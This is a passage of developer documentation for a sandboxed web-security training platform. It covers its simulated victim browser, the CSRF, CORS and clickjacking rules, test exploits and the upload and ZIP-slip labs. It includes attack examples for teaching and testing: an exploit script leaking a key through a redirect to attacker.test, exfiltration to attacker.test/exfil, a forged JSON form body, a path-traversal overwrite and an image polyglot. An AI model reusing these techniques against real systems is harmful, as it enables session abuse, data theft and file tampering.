      checkMailAction({ browser: (req) => labFor(req).admin, mailbox: ADMIN_MAILBOX, rearm }),
      // opens whatever link the player types in (input: 'url')
      sendLinkAction((req) => labFor(req).admin, { rearm, description: { id: '...', en: 'opens any link you send, while signed in to Pilgrim-ID' } }),
    ],
  },
}));
```

Both take `name`, `label`, `description` (platform defaults fit) and a REQUIRED `rearm`; `checkMailAction` answers with a
bilingual note when the mailbox is empty or the newest mail has no such link. A custom action is
`{ name, label, description?, input?: 'url', run: (req, { url }) => note | void }`:

```ts
{ name: 'open-inbox', label: { id: 'Minta admin membuka kotak masuk', en: 'Ask the admin to open the inbox' },
  description: { id: 'membuka /inbox dan mengklik tautan pertama di sana', en: 'opens /inbox and clicks the first link on it' },
  run: (req) => {
    const s = labFor(req);
    rearm(req, s.admin);
    const link = firstLinkOn(s.admin.follow('http://citadel.test/inbox').page?.body ?? '');
    if (link === undefined) return { id: 'Kotak masuk admin kosong.', en: "The admin's inbox is empty." };
    s.admin.follow(link, { referrer: 'http://citadel.test/inbox' }); // a click on a citadel page: pass its URL
  } },
```

The engine mounts `POST <lab>/victim/<name>?level=<level>` per action **before** the lab's own routes (the
`/victim/` prefix is reserved): it reads the `url` field (`input: 'url'`), runs `run` synchronously (a Promise is a
500), and answers 303 back to `<lab>?level=<level>`, so the forms work without JavaScript. Under every lab page
rendered with `sendPage` the layout adds the panel: the two hosts, one form per action (the link field keeps the last
link sent), "What the victim's browser did" (the note, and per visit its outcome and request count, **never its
URLs**: they can carry the very secret the lab is about; only the visits made during the last action, numbered within
it, the last 5 shown; a `run` that throws is shown as failed and its error goes to the error handler), **the player's
mailbox only**, and "Your server (attacker.test) received…". Platform strings are bilingual; everything else is escaped. The only way a victim-side
secret may reach the player is the lab's flaw (the attacker log, or a stolen session): never echo the victim's pages
or the admin's mail anywhere else. Labels: `VICTIM_LABELS.checkMail` / `.sendLink`, or a lab `Text`.

- **`description`** (optional `Text`) is shown under the button: the victim's script in a few words ("opens the newest
  mail and clicks its first link", "opens any link you send, while signed in to Pilgrim-ID").
- **The note carries what the summary cannot show.** The panel summarises each visit by outcome and request count only,
  so it cannot say *why* nothing happened: "the admin was not signed in", "the admin has no new mail", "the reset link
  had expired". `run` returns that note as `Text` (player guidance, shown in the player's language) or, rarely, a plain
  string (lab content, shown as-is); either is clipped to 500 chars. Anything else is a programming error (500).
- **A click on a citadel page passes `referrer` explicitly**: `follow(link, { referrer: 'http://citadel.test/inbox' })`.
  Without it the request carries no Referer, as for a link opened from a mail client, and a Referer-based lab would
  silently test nothing.
- **Re-arm the victim at the start of every action.** The player's link can undo the victim's standing state: a link
  to `/logout`, or a page whose `Set-Cookie`s overflow the 20-cookie jar and evict the admin's session. A lab without
  Restart would then stay stuck until the 26 h TTL. The presets require `rearm` (call it first in a custom `run`): it
  restores that state by setting cookies (`browser.cookies.set`), as the factory did, and never browses (a visit would
  show in the report). Re-arm only the standing state, never what the exploit itself changes. A victim with no
  standing state (nobody signed in, nothing to restore) passes an explicit no-op, `rearm: () => {}`, so the choice is
  made on purpose and a forgotten re-arm is an error, not a lab that silently gets stuck. `browser.cookies.clear()` is
  a valid re-arm for a victim whose standing state is "a fresh browser" (GK-16: the admin opens your link in a fresh
  browser, then signs in), but only when the action's `description` says so ("in a fresh browser"), and only when no
  exploit relies on the victim's cookies surviving from one action to the next.

Restart: a victim-driven lab whose state can get stuck may pass `reset: (req) => labs.reset(req)`; that drops the
world (inbox, attacker log, victim cookies) with the rest. The usual rule applies: no Restart on a lab with limiters.

### Across sites: CSRF, CORS and clickjacking (engine task E1)

The Forum labs FP-01 to FP-04 need what the **player's attacker page** makes the admin's browser do: submit a hidden
form, call `fetch()`, frame a citadel page under a decoy. The page is the player's input, declared by the lab
(`SimAttackerPage`: `{ url?, referrerPolicy?, sandboxed? }`); it is never parsed from HTML and never run, since there is no
JavaScript engine. Its `url` is on attacker.test or any subdomain of it (default `ATTACKER_PAGE_URL`, `http://attacker.test/`),
and relative URLs on the page resolve against it. Its referrer policy defaults to Chrome's `strict-origin-when-cross-origin`.
`sandboxed: true` is a sandboxed iframe (or a `data:` document) inside the page: an opaque origin, so `Origin: null` and
no Referer at all, and its form or link navigates that frame, not the top-level window. The rules come from Fetch, RFC 6265bis, HTML and CSP3 as
current Chrome applies them (`core/sim/cross.ts`, the jar in `core/sim/cookies.ts`), all pure, inside the no-network guard.

| `SimBrowser` method | What the page does | Request |
|---|---|---|
| `crossSiteLink(url, { page? })` | a link the admin clicks, or `location = url` | top-level GET navigation |
| `crossSitePost(url, form, { contentType?, page? })` | an auto-submitted `<form>` with that enctype | top-level POST navigation |
| `corsFetch(url, { method?, credentials?, headers?, body?, page? })` → `SimFetch` | `fetch(url, init)` | a CORS request; its answer is never rendered |
| `frame(url, { page? })` → `SimFrame` | `<iframe src=url>` | GET navigation of a frame |
| `clickThrough(frame, action, form, { contentType? })` → `SimClick` | the admin clicks the decoy over the framed page's button | POST navigation of the frame, made by the framed citadel page |

**SameSite: what the jar sends.** Every cookie keeps its SameSite (`Lax` when the line has none or an unknown value;
`SameSite=None` without `Secure` is refused). `citadel.test` is a secure context, so `Secure` cookies are kept and sent
over http (see "The twin" above).

| Request | Same-site for cookies? | Strict | Lax | None |
|---|---|---|---|---|
| `follow` (from mail, or clicked on a citadel page), `submit` | yes | sent | sent | sent |
| `crossSiteLink` (cross-site, top-level GET) | no | — | sent | sent |
| `crossSitePost` (cross-site, top-level POST) | no | — | — | sent |
| the GET after that POST's 303 | no | — | sent | sent |
| `corsFetch` with `credentials: 'include'` (GET or POST) | no | — | — | sent |
| `corsFetch` with `'same-origin'` (fetch's default) or `'omit'` | no cookies to another origin | — | — | — |
| `frame`, a `clickThrough` in it, a link or form in a sandboxed frame | no: the top-level page is the attacker's | — | — | sent |
| a citadel page in the top-level window that moves on (`Refresh`) | yes | sent | sent | sent |

A cross-site answer that is not a top-level navigation's (a fetch, a frame) may store only `SameSite=None` cookies: it can
neither set nor delete the admin's Lax session. **Modelling choices (current Chrome):** no "Lax-allowing-unsafe" exception.
Chrome 157 still sends a cookie that has NO SameSite attribute and is under 2 minutes old on a cross-site top-level POST
(the E1 review saw it), and the sim does not model that, so **a lab must NEVER set a session cookie without an explicit
SameSite**: in the real browser a fresh session would ride along on a cross-site POST that the sim refuses, and the lab
would teach the wrong thing. Set every lab cookie through a TwinCookie (it always writes the attribute, `Lax` by default),
and give a raw `Set-Cookie` line in a citadel handler or test an explicit `SameSite` too. Third-party cookies are on, as in Chrome's default, so a
`SameSite=None` cookie reaches a frame or a credentialed fetch (Firefox's Total Cookie Protection partitions it and Safari
blocks it, so in those browsers a framed or fetched citadel is signed out even then); `http://citadel.test` and
`https://citadel.test` are different origins.

**Origin and Sec-Fetch.** Every request carries `sec-fetch-site`, `-mode` and `-dest` as Chrome 157 sends them, and
`sec-fetch-user: ?1` when the victim's own action started it (a link it opened, a form it submitted, its click through a
frame); a script on the attacker's page navigating, a frame loading or a fetch carry none. Every POST carries `Origin`.
Sec-Fetch-Site never gets less cross along a redirect, and a navigation the browser itself started (a link from mail)
stays `none` across redirects; a citadel page that moves on starts a new request of its own (`same-origin`, no
`sec-fetch-user`). `fetch()` cannot forge `Cookie`, `Origin`, `Referer`, `Host`, `Sec-*` or `Proxy-*` (dropped, as
browsers drop them).

| Request | `Origin` | `Referer` | `sec-fetch-site` / `-mode` / `-dest` / `-user` |
|---|---|---|---|
| `follow` from mail | none | none | `none` / `navigate` / `document` / `?1` |
| `follow` clicked on a citadel page | none | that page | `same-origin` / `navigate` / `document` / `?1` |
| `submit` | `http://citadel.test` | the citadel page, when given | `same-origin` / `navigate` / `document` / `?1` |
| `crossSiteLink` | none | the page's, under its policy; **none from a sandboxed frame** | `cross-site` / `navigate` / `document` / — |
| `crossSitePost` | the page's origin; `null` when its policy is `no-referrer`, `same-origin`, or an https page posts to http, and from a sandboxed frame | the page's, under its policy; **none from a sandboxed frame** | `cross-site` / `navigate` / `document` (`iframe` when sandboxed) / — |
| `corsFetch` | always the page's origin (the policy never hides it); `null` from a sandboxed frame or after a redirect to another origin | the page's, under its policy; **none from a sandboxed frame** | `cross-site` / `cors` / `empty` / — |
| `frame` | none | the page's, under its policy | `cross-site` / `navigate` / `iframe` / — |
| `clickThrough` | `http://citadel.test` (`null` under the framed page's own `no-referrer`) | the framed page, under ITS policy | `same-origin` / `navigate` / `iframe` / `?1` |

A sandboxed frame's document has an opaque origin, and an opaque origin has no referrer (Fetch): Chrome sends neither its
page's URL nor its origin, whatever the policy. So **a level that accepts a missing Referer is beaten by a sandboxed
iframe**; checked in Chrome 157 (E1 review).

**Form bodies** are encoded as HTML does: urlencoded (the default, and any enctype a browser does not know), `text/plain`
(`name=value` lines, unescaped: one field named `{"notify":"all","x":"` with the value `"}` is a JSON body) and
`multipart/form-data` (a fixed boundary). `SimRequest.body` holds what the app's own parsers would read (an urlencoded
form's fields, a JSON object's string members); a text/plain or multipart body gives none, so a level that parses it reads
`r.rawBody`. A fetch's string body without a Content-Type goes as `text/plain;charset=UTF-8`.

**CORS: may the page read the answer?** A cross-origin fetch with a method other than GET, HEAD or POST, or any header
that is not CORS-safelisted (Accept, Accept-Language, Content-Language, a Content-Type of the three simple types; at most
128 bytes; no `"():<>?@[\]{}`), would need a **preflight**. The sim approves none (no lab answers `OPTIONS`; no FP lab
teaches preflight), so such a request is **not sent** (`verdict: 'preflight'`). Otherwise the request IS sent, cookies
and all, and does whatever it does on the citadel; CORS only decides what the page may read (`corsCheck`, on every
answer, redirects included: a failed check ends the fetch there).

| Access-Control-Allow-Origin | Access-Control-Allow-Credentials | `credentials` | The page may read? |
|---|---|---|---|
| absent | any | any | no (`no-allow-origin`) |
| `*` | any | `omit` or `same-origin` | yes |
| `*` | any | `include` | no (`wildcard-credentials`) |
| exactly the request's Origin | any | `omit` or `same-origin` | yes |
| exactly the request's Origin | `true` | `include` | yes |
| exactly the request's Origin | absent, `TRUE`, `false` | `include` | no (`no-allow-credentials`) |
| another origin, another case, a trailing `/`, a port, two values | any | any | no (`origin-mismatch`) |
| `null` | `true` | `include` from a sandboxed frame (`Origin: null`) | yes |

A readable answer is `SimFetch.body`; the presets send it home (below). `'invalid'` is a fetch() that throws before
sending (a GET with a body, a header it cannot carry); `'no-answer'` is one that reached your own server or nowhere.

**Framing: is the page shown in the frame?** `framingOf` is checked on every page a frame would show (never on a
redirect); a page that refuses is not shown, so nothing on it runs (the XSS browser does not judge it) and its Refresh
never fires, though its request was sent. Response headers only: a `<meta>` sets neither header, and
`Content-Security-Policy-Report-Only` enforces nothing. Every enforced CSP (headers, or policies split by commas) applies.

| Response | Shown in a frame on attacker.test? |
|---|---|
| no framing header | yes |
| `X-Frame-Options: DENY` (any case) | no |
| `X-Frame-Options: SAMEORIGIN` | no (yes only when every ancestor is the page's own origin) |
| `X-Frame-Options: ALLOW-FROM ...`, `ALLOWALL`, garbage, empty | yes (browsers no longer support ALLOW-FROM) |
| `X-Frame-Options: DENY, SAMEORIGIN` (conflicting values) | no |
| CSP `frame-ancestors 'none'`, or an empty list | no |
| CSP `frame-ancestors 'self'` | no |
| CSP `frame-ancestors *`, `http:`, `http://attacker.test`, `attacker.test`, `*.attacker.test` (subdomains only, not the apex) | yes for an ancestor it matches |
| any enforced CSP with `frame-ancestors` | it alone decides: X-Frame-Options is then ignored |

**The presets** (each with a REQUIRED `rearm`, like `checkMailAction`): the lab keeps the player's page in its
per-session state as an `AttackerScript`, `{ page?: SimAttackerPage, does }`, where `does` is ONE step:
`{ kind: 'form', action, method?, enctype?, fields }`, `{ kind: 'link', url }` or `{ kind: 'fetch', url, method?,
credentials?, headers?, body? }`. Store what the player wrote clipped (`clip`) and declare its weight (section 8, "All
victim state goes through perSession").

```ts
// The admin is signed in with the session cookie its level sets: rearm uses the SAME attributes as the level's TwinCookie.
const rearm = (req: Request, admin: SimBrowser) => { admin.cookies.set(SESSION, adminSession(labFor(req)), sessionAttributes(req.level)); };
victim: {
  sim: (req) => labFor(req).world,
  actions: [
    visitAttackerPageAction({ browser: (req) => labFor(req).admin, page: (req) => labFor(req).page, rearm }), // FP-01/02/03
    frameAndClickAction({ browser: (req) => labFor(req).admin, rearm,                                            // FP-04
      // The framed page's button under the decoy: the lab knows its own page's form.
      click: (_req, framed) => (new URL(framed.url).pathname === '/moderation/confirm' ? { action: '/moderation/grant', fields: { user: 'pilgrim' } } : undefined) }),
  ],
},
```

- `visitAttackerPageAction({ browser, page, rearm })`: the admin opens the page (your server logs that GET), and the page
  does its step: a form (POST via `crossSitePost`; `method: 'GET'` puts the fields in the action's query and follows it),
  a link, or a fetch. **A fetch the browser lets the page read is sent home**: `POST ATTACKER_EXFIL_URL`
  (`http://attacker.test/exfil`) with the answer as its body, in the player's attacker log. That is FP-03's proof; when the
  read is blocked, nothing but the page load is logged.
- `sendAttackerPageAction({ browser, page, rearm })`: the same page, at the attacker.test link the player sends in the
  panel's link field, so its origin and path are the player's (`http://citadel.test.attacker.test/`,
  `http://attacker.test/citadel?x`). A link off attacker.test is never opened: it is no free-form "send link".
- `frameAndClickAction({ browser, click, rearm, page? })`: the admin opens your framing page (`page(req)`, default
  attacker.test), which frames the citadel link you send. If the frame shows it, `click(req, framed)` names the framed
  page's form, which is submitted inside the frame; undefined means there is no button under the decoy.

Each answers with a bilingual note for what the summary cannot show: no page written yet, a link off attacker.test, the
fetch's verdict (the read, the preflight, which CORS header was missing), the header that refused the frame, a click that
hit nothing.

**What the levels decide, and what an FP lab must do:**
- A level's session cookie's SameSite is its decision, in the level file (TwinCookie), and the re-arm sets the same
  attributes. **A request the attacker's page makes carries only `SameSite=None` cookies**, except a cross-site
  top-level GET (Lax too). So every level exploitable by a cross-site form POST, a credentialed fetch or a frame needs the
  admin's session at `SameSite=None; Secure`: FP-01 Acolyte (as its design says), the FP-02 levels, FP-03's credentialed
  read, and FP-04's framed page and its click (a Lax session is signed out inside the frame, as in Chrome). Divine may
  keep Lax or Strict on top of its real fix.
- CORS and framing headers are set by the level on its own route only, never globally: the real route through
  `setLabHeaders` (`core/http.ts`, from the SC XSS batch), the citadel twin in its `SimResponse` headers with the same
  values (`labHeaders(h)` there builds them from the same object). The sim reads them from the `SimResponse` only. CSP `frame-ancestors` is modelled (with X-Frame-Options), so FP-04's Divine fix is real; the XSS rule "a level
  whose only fix is a CSP is not a Divine" is about script CSP, which the XSS oracle does not evaluate.
- A level's Origin, Referer, Content-Type or custom-header check takes a `RequestVisit` (the twin, above): the same
  `headers`, `body` and `text` in both browsers, and the Origin check is `visit.headers.origin === visit.self`, never
  a hard-coded `http://citadel.test` (the real route sees `Origin: http://127.0.0.1:<port>`).

**Memory.** Nothing here is a new store: the primitives keep only the world's visits and log entries (copies, under their
caps) and a frame handle the browser holds weakly, and the presets keep nothing, so the byte budget weights are unchanged
(`tests/sim-cross.spec.ts`, "budget, caps and copies").

**Shaped for AR-14 (WebSocket hijacking, Phase 3), not implemented.** No primitive opens a WebSocket yet; the rules a
handshake needs are in place so AR-14 adds one primitive and one `AttackerStep` kind, nothing more. As Chrome sends it, a
handshake from the attacker's page is a GET that always carries `Origin` (`originHeader` with `mode: 'websocket'`), no
Referer and no `Sec-Fetch-*` (`fetchMetadata` gives none for that mode), gets no CORS check, and is cross-site and not
top-level for cookies, so only `SameSite=None` ones go. `classifySimUrl(url, base, { websocket: true })` takes `ws:` and
`wss:` with the usual host and port rules; without the option they stay `other`. `AttackerStep` is dispatched
exhaustively, so a `{ kind: 'websocket', ... }` member does not compile until the presets run it; today such a step is a
lab bug.

### Testing

An exploit is a script, as the player would do it: craft the link → trigger the victim (`POST <lab>/victim/<name>`) →
read the attacker log on the lab page (`GET <lab>?level=<level>`) → complete the attack on the real lab → flag. Divine
resists with its usual answer. See SV-01 in `tests/sim-lab.spec.ts`:

```ts
const exploit: Script = async (agent, level) => {
  await agent.post(`${LAB}/victim/send-link?level=${level}`).type('form').send({ url: 'http://citadel.test/continue?next=http://attacker.test/x' });
  const page = await agent.get(`${LAB}?level=${level}`);
  const ref = attackerHits(page.text).find((h) => h.url === 'http://attacker.test/x')?.referer;
  const key = ref === undefined ? 'none' : new URL(ref).searchParams.get('key') ?? 'none';
  return agent.post(`${LAB}?level=${level}`).type('form').send({ key });
};
```

Read the page as the player would, with the helpers in `tests/helpers.ts`: `attackerHits(html)` parses the panel's
attacker log (one `{ seq, at, method, url, referer?, body? }` per `<li data-seq>`, unescaped, oldest first, like
`world.attackerLog.entries()`), `referers(html)` lists the Referers, `panelOf(html)` cuts out the panel and
`unescapeHtml(s)` undoes the escaped output tag. They read only the panel's log, never the lab's own content or the
mailbox, in either language. Test seams: `labFor({ sessionId: sid, level }).world` (`.visits` for the full trace,
`.attackerLog.entries()`, `.inbox.list(ADMIN_MAILBOX)`, `.now = () => t` for timestamps and expiry). `describeLabView`
works unchanged (it skips the panel's `sim-action` forms). Add the lab-specific cases: the victim's secret never
appears on the page except through the flaw, players and levels are isolated, the legit victim flow ends on a citadel
page, and links the lab builds from attacker input are shown escaped.

**The victim-lab test kit** (`src/districts/_shared/victim-lab.testkit.ts`, any district; GK-08, 09, 10, 11 and 16 use
it) holds what these specs repeat, modelled on `pilgrim-lab.testkit.ts`:

- `victimClient(path)`: `sendLink(agent, level, url, action?)` and `checkMail(agent, level, action?)` (the victim's
  buttons); `browse(agent, url, maxHops = 6)` follows your real browser's redirects and returns `{ res, at }`.
- `describeSignInView({ challenge, path, account? })`: `describeLabView` for a front page that signs in with a
  username and password (default pilgrim/pilgrim).
- `describeVictimAction({ challenge, path, description: { en, id }, label? })`: the panel says what the victim does, in
  both languages, at every implemented level (write `'` as `&#39;`: the panel escapes it).
- `describeLabCookies({ challenge, path, cookies: [{ name: (level) => string, set: (agent, level, base) => request,
  httpOnly? }] })`: each lab cookie has one name per level and gets the canonical path even from an upper-case URL
  (`set` receives the upper-cased path as `base`), and is HttpOnly unless `httpOnly: false`.
- `describeOddBodies({ challenge, path, forms, statuses?, bodies? })`: odd JSON bodies on the forms besides the front
  page (e.g. `['/forgot', '/reset']`) are a failed request at every level (default status 200; add 303 for a form that
  redirects), never a 500 or a flag.
- "Never leaves the lab" assertions: `expectInLab(res, path, level)` (a redirect status whose Location is under the lab
  path with `level=<level>`; returns the Location), `expectAwayPage(res)` (sendSimRedirect's page for an off-lab target:
  200, no Location, no Refresh, the URL as text, no link; returns the section), `expectNoWayOut(res)` (200, no Location,
  no Refresh) and `forwardNoteOf(html)` / `awayOf(html)` to read the forward note and the away page.

Engine-level twin tests live in `tests/twin.spec.ts` (a fixture lab for both browsers, `sendReply` on a fake Response,
the cookie attributes, `visitOf`).

Across sites: `tests/sim-cross.spec.ts` is the guard (the SameSite, Origin, Sec-Fetch, CORS and framing matrices above,
preflight, form bodies, the presets, and budget, caps and copies), and the fixture lab XS-01 in
`tests/sim-cross-lab.spec.ts` is the worked example through the real panel: a forged form whose confirmation mail lands
in the player's mailbox, a credentialed fetch whose answer reaches the attacker log at `ATTACKER_EXFIL_URL`, and a framed
confirm page clicked through, each resisted at Divine. In a lab spec, read the proof as the player would: the mailbox,
`attackerHits(html)` (the exfil hit's `body`), or the lab's own state after the click; the panel's note says what the
browser refused.

## 9. Upload labs (`core/upload.ts`, `core/upload-zip.ts`, `core/simfs.ts`)

The Scriptorium's upload labs (SC-05 SVG, SC-07/08 webshell filters, SC-09 polyglot, SC-10 ZIP slip, SC-11 path
traversal) take files from the player, keep them in a **simulated file system**, and "run" some of them. All of it is
in memory, and **nothing ever executes** (owner decision Q7). No dependency: Node 22's built-in `Response.formData()`
parses multipart, and `node:zlib` inflates archives. `tests/upload-guard.spec.ts` parses the three modules with tsc and
allows only `node:buffer`, `node:zlib`, each other, `core/sim/limits.ts` and `core/lab.ts` (no `node:fs`, network,
`child_process`, `vm`, `eval`); it then spies on all of those through a whole upload, unzip, store and "run".
The worked example is the fixture lab UP-01 in `tests/upload-lab.spec.ts`.

### The upload route

```ts
// challenge.ts
import express, { type NextFunction, type Request, type Response } from 'express';
import { SIMFS_LIMITS } from '../../../core/simfs.js';
import { UPLOAD_LIMITS, parseMultipart, settle, uploadGate } from '../../../core/upload.js';

router.post('/upload', uploadGate(), express.raw({ type: 'multipart/form-data', limit: UPLOAD_LIMITS.maxBytes }), async (req: Request, res: Response) => {
  // A lab that stores the upload caps it at what the simulated file system takes, so a file that parses also fits.
  const up = tryDb(req, await settle(parseMultipart(req, { maxFiles: 1, maxFileBytes: SIMFS_LIMITS.fileBytes })), 'Upload error'); // await OUTSIDE tryDb
  if (!up.ok) return show(res, { ok: false, text: up.message });
  const file = up.value.files.find((f) => f.field === 'scroll');
  if (file === undefined) return show(res, { ok: false, text: 'Choose a scroll to upload.' });
  const stored = tryDb(req, () => impl.for(req.level).store(labFor(req).fs, file), 'Storage error'); // the level's flaw
  // ...
}, (err: unknown, req: Request, res: Response, next: NextFunction) => {
  // Optional: express.raw's 413 on the lab's own page (status kept); any other error goes on to the platform handler.
  if ((err as { type?: unknown } | null)?.type !== 'entity.too.large') return next(err);
  res.status(413);
  return show(res, { ok: false, text: 'The scroll is too large (at most 2 MiB).' });
});
```

- **The route is `POST /`, not `/upload`, in the Scriptorium labs.** `mountUpload` (`scriptorium/_shared/lab.ts`) and the scroll desk mount the upload on the lab root, because `describeLabView` requires every form to have no `action` (it posts back to the page URL) and posts a urlencoded form to the lab root to check the echoed field. The snippet above shows the plain-route shape of UP-01; a lab whose view is checked by `describeLabView` takes the upload at `POST /`, and the same handler answers a non-multipart post with the upload error.
- **`uploadGate()` first**, before the body is read: at most `UPLOADS_IN_FLIGHT` (4) uploads at once, across every
  upload route of every lab, so their bodies and parses stay bounded together (about 16 MiB with four near-2 MiB
  uploads alive, measured). The fifth gets a 503 (`Retry-After: 2`, `Connection: close`) with a plain message, at once:
  its body is never read or buffered. A slot is freed when the response finishes or closes (a client that hangs up) or
  the request fails, and when the body stalls: no bytes for `UPLOAD_BODY_TIMEOUT_MS` (30 s; `uploadGate({ bodyTimeoutMs
  })`) answers 408 and drops the connection. That is an idle timeout, so a client trickling a byte now and then (or
  slowly sending a huge declared body that `express.raw` drains before its 413) still holds its slot until Node's own
  `requestTimeout` (300 s). On a loopback, single-player lab the only such client is the player's own, so this is
  accepted rather than defended further.
- **`express.raw` on the upload route only** (owner decision Q6), with `limit: UPLOAD_LIMITS.maxBytes` (2 MiB). The
  app-wide `express.json()`/`urlencoded()` ignore multipart. A bigger body gets 413 before the lab's handler runs, and
  the limit counts the *inflated* body, so a small gzip of a large one gets 413 too. Without the optional error handler
  above, the 413 is the platform's bare error page; with it, the lab's own page (its `err.type` is `entity.too.large`).
  A form posted without `enctype="multipart/form-data"` arrives as an object, and `parseMultipart` refuses it.
- **`parseMultipart` is async and `tryDb` is not.** `settle(promise)` turns the settled parse into a thunk that returns
  the value or rethrows, so `tryDb` applies its usual rule: `Upload error: <message>` below Divine, `Invalid request.`
  at Divine. Every refusal is an `UploadError` with a message meant for the player; one that escapes is a 400.
- **Caps** (`UPLOAD_LIMITS`): body 2 MiB, 32 parts, 8 files, 512 KiB per file, 16 KiB per text field, 255-character
  filenames and field names, 255-character content types. The part count is checked by a scan of the body before it
  is parsed, so a flood of tiny parts costs a scan, not 40 000 entries. A lab may pass **lower** caps (an SVG lab:
  `{ maxFileBytes: 64 * 1024 }`), never higher. A higher one, or a non-integer, is a plain `Error`: a lab bug. **A lab
  that stores what it receives passes `maxFileBytes: SIMFS_LIMITS.fileBytes` (128 KiB)**, so the player gets the
  upload's own error rather than a storage error for a file the simulated file system cannot hold. (An archive lab
  keeps the 512 KiB default: the archive itself is not stored, its entries are.) The content type must hold exactly
  one `boundary=`, a token or a quoted string; anything else is refused before parsing.
- **Fields** are a null-prototype record; a repeated name keeps its first value. Read them with
  `field({ body: up.value.fields }, 'caption')`. The empty part a browser sends for an empty file input is dropped.

### What a level receives

- **`filename` exactly as the client sent it**: `../`, `\`, a leading `/`, case, dots, spaces, `%00` and every other
  percent sequence. Only the three escapes browsers write are undone, as the WHATWG parser does: `%0A`, `%0D`, `%22`.
  A NUL byte stays U+0000 (never stripped, never a truncation point). Invalid UTF-8 becomes U+FFFD, and its bytes cannot
  be recovered. A lab that decodes a name, or ends it at a NUL the way C does, does it in its level file, where View
  Source shows it.
- **`contentType` is the uploader's claim**, as the File API reports it: ASCII-lowercased with its parameters,
  `text/plain` when the part had none, `''` for a non-ASCII value. It says what the client claims, never what the bytes
  are.
- **`bytes`** is the parser's own copy, not a view of the request body.

### Storing: `simFs()`

```ts
// model.ts
const labs = perSession((): LabState => {
  const fs = simFs();                       // or simFs({ separators: '/\\' }) for a Windows-style server
  fs.write('/srv/app/templates/welcome.txt', 'Welcome, pilgrim.', { contentType: 'text/plain', pinned: true });
  return { fs, canary: newCanary() };
});
```

- **One per player and level, made in the `perSession` factory** (it throws anywhere else), next to the rest of the
  lab state, so one eviction or one `reset` drops it all together. Seed it there, and **pin** what the lab depends on
  (a sentinel, a secret): a pinned file is never dropped to make room, but it can still be overwritten (SC-10's proof).
- **Paths go through the simulated OS** (`resolveSimPath`, also `fs.resolve`). Every call splits on the separators (`/`,
  plus `\` on a `'/\\'` file system), drops empty and `.` segments, lets `..` remove the segment before it (never above
  the root), and makes the path absolute. Nothing else changes: `....` and `..b` are ordinary names, and case, NUL,
  trailing dots and percent sequences are kept. This is the ground truth, as `classifySimUrl` is for URLs: **the level's
  own check is the flaw**, and the file system decides where the write really lands. `write('/srv/app/uploads/restore/
  ../../templates/welcome.txt', ...)` overwrites `/srv/app/templates/welcome.txt`. A correct (Divine) check uses the
  same rules:

  ```ts
  const base = fs.resolve(dir);
  const key = fs.resolve(`${base}/${name}`);
  // Inside the root is anything but the root itself; inside any other directory is under `<dir>/`.
  const inside = base === '/' ? key !== '/' : key.startsWith(`${base}/`);
  if (!inside) return reject(name); // escapes dir (or names dir itself): refused, the sentinel untouched
  ```

  (`tests/simfs.spec.ts` runs this snippet against `/`, sibling directories sharing a prefix, `....//` and both
  separator styles.)
- **Bounds** (`SIMFS_LIMITS`): 32 files, 128 KiB per file, 256 KiB in all, 512-character paths (checked once
  resolved, too), 255-character content types. Past the file count or the total, the **oldest unpinned file is
  dropped**, the way the sim drops its oldest mail. A file over 128 KiB (refused by its byte length, before any copy), a
  write to the root, or no room even after dropping every unpinned file is a `SimFsError` and changes nothing. Wrap
  writes in `tryDb(req, () => ..., 'Storage error')`.
- **Every stored Buffer is a copy with memory of its own.** `Buffer.subarray` keeps its whole parent alive, and
  `Buffer.from(x)` of a small `x` is a slice of Node's shared 8 KiB pool (zlib even answers small inflates with a view of
  16 KiB). `simFs` copies with `ownBytes` from `core/upload.ts`; use it for any other Buffer a lab keeps.
- **Memory.** A full instance is about 315 KiB at worst (measured with a full GC; about 270 KiB with short ASCII names).
  `simFs` caps its holder like a victim world: at most `SIM_LIMITS.newWorldsPerMinute` (30) new instances a minute,
  and each instance weighs `SIMFS_LIMITS.weight` (352 KiB) in the 96 MiB byte budget shared with every victim world
  (section 8). A lab state weighs every store it holds: SC-05's (a world, the moderator's XSS browser and a file
  system) about 1.9 MiB, SC-09's (a scroll desk: a file system only) 352 KiB. Eviction
  from that budget is a reset, so keep no limiter in this state. Upload labs have no limiter, so they may offer
  Restart (`reset: (req) => labs.reset(req)`).

### Archives: `readZip(bytes)` (SC-10)

```ts
// The archive's entries may inflate to at most what the simulated file system holds (the default total is 2 MiB).
const entries = tryDb(req, () => readZip(file.bytes, { totalBytes: SIMFS_LIMITS.totalBytes }), 'Archive error');
if (!entries.ok) return show(res, { ok: false, text: entries.message });
const fs = labFor(req).fs;
for (const e of entries.value) {
  if (e.directory) continue; // a folder entry ("notes/") holds no bytes: the simulated file system has no empty directories
  const written = tryDb(req, () => impl.for(req.level).extract(fs, TARGET_DIR, e), 'Storage error'); // the level's join
  // ...list e.name as written or rejected
}
```

Synchronous, inside `tryDb`. Pass `{ totalBytes: SIMFS_LIMITS.totalBytes }`, so an archive that could never fit
is refused as an archive. **Skip `e.directory` entries**: their name ends in `/` and they hold nothing, and writing one
would store an empty file named after the folder. It returns `{ name, directory, method, size, compressedSize, bytes }`
per entry, in central-directory order. **Names are exactly as written** (`../`, `\`, absolute
and drive paths, NUL) and decoded as UTF-8, with U+FFFD for an invalid sequence. Bounds (`ZIP_LIMITS`): 64 entries
(read from the end record before anything else), 255-character names, and a zip-bomb guard: the declared sizes may total
2 MiB, and no entry inflates past its declared size (`inflateRawSync`'s `maxOutputLength` stops it there). A nested
archive is one entry of bytes and is never opened. CRC-32 and sizes are checked. ZIP64, multi-volume, encrypted and
other-method archives are refused, and so are trailing bytes after the archive comment. Errors name an entry by
number, never by its name. The level "extracts": it builds the path with its own (flawed) join or filter and calls
`fs.write`. Note for the lab page: Python's `zipfile` on Windows turns `\` into `/` in `ZipInfo(name)`, so a
backslash name has to be set on `.filename` afterwards (see `tests/upload-zip.spec.ts`).

### Images: `looksLikeImage(bytes)` / `sniffImage(bytes)` / `placeholderImage(sniff)` (SC-09)

They check the magic bytes and the declared size of PNG, JPEG, GIF and WebP, and **only the header, on purpose**.
Whatever follows the header is never read, so `GIF89a` + a size + `<?hvwa CANARY ?>` passes. That is the Inquisitor
lesson (a correct header proves the file's start, not the whole of it). Never use either as a safety check. Divine
does not validate, it re-encodes. The engine has no image decoder, so Divine serves `placeholderImage(sniff)`: a fresh
GIF the server writes from the sniffed size alone. It keeps no byte the player sent and is always 35 bytes: its
logical screen is the size clamped to 65535, and its image is 1x1. **Never allocate pixels from a sniffed size**:
`sniffImage` accepts PNG sizes up to 2^31 - 1 on each side, so "a blank image of that size" would exhaust the 512 MB
